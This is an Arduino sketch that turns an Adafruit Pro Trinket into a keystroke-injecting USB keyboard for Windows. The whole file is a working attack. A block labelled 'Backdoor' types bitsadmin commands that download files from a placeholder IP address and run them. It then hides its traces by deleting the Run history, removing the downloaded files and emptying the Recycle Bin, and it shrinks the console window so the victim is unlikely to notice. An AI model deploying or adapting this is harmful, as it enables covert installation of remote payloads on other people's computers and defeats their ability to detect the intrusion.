#include <ProTrinketKeyboard.h>

void pollingDelay(unsigned long);

void setup()
{
  // start USB stuff
  TrinketKeyboard.begin();
}

void loop()
{
  // Wait a few seconds for the keyboard to get picked up by the OS
  pollingDelay(2000L);

  // Bring up run
  TrinketKeyboard.pressKey(KEYCODE_MOD_LEFT_GUI, KEYCODE_R);
  TrinketKeyboard.pressKey(0, 0);

  // Slight delay to allow for run prompt to display
  pollingDelay(500L);

  // Enter cmd in run prompt (println acts as enter pressed)
  TrinketKeyboard.println("cmd");

  // Give a bit of time for the command prompt to display and capture focus for keyboard entry
  pollingDelay(1000L);

  // Set command prompt window size
  TrinketKeyboard.println("mode con: cols=20 lines=1");

  // Set command prompt colors
  TrinketKeyboard.println("COLOR fe");

  // Backdoor
  TrinketKeyboard.println("bitsadmin /transfer This /download /priority high http://<IP ADDRESS>/<FILENAME> %temp%\<FILENAME>&start;%temp%\<FILENAME>");
  TrinketKeyboard.println("bitsadmin /transfer Is /download /priority high http://<IP ADDRESS>/<FILENAME> %temp%\<FILENAME>&start;%temp%\<FILENAME>");
  TrinketKeyboard.println("bitsadmin /transfer Fun /download /priority high http://<IP ADDRESS>/<FILENAME> %temp%\<FILENAME>&start;%temp%\<FILENAME>");
  TrinketKeyboard.println("reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f");  //clear history
  TrinketKeyboard.println("del /F %temp%\<FILENAME>");  //delete file
  TrinketKeyboard.println("del /F %temp%\<FILENAME>");  //delete file
  TrinketKeyboard.println("del /F %temp%\<FILENAME>");  //delete file
  TrinketKeyboard.println("rmdir /s %systemdrive%\$Recycle.bin");  //empty recycle bin
  TrinketKeyboard.println("y");

  exit(0);
}

void pollingDelay(unsigned long delayMillis)
{
  unsigned long time_stamp = millis();
  while (millis() < (time_stamp + delayMillis)) {
    TrinketKeyboard.poll();
  }
}
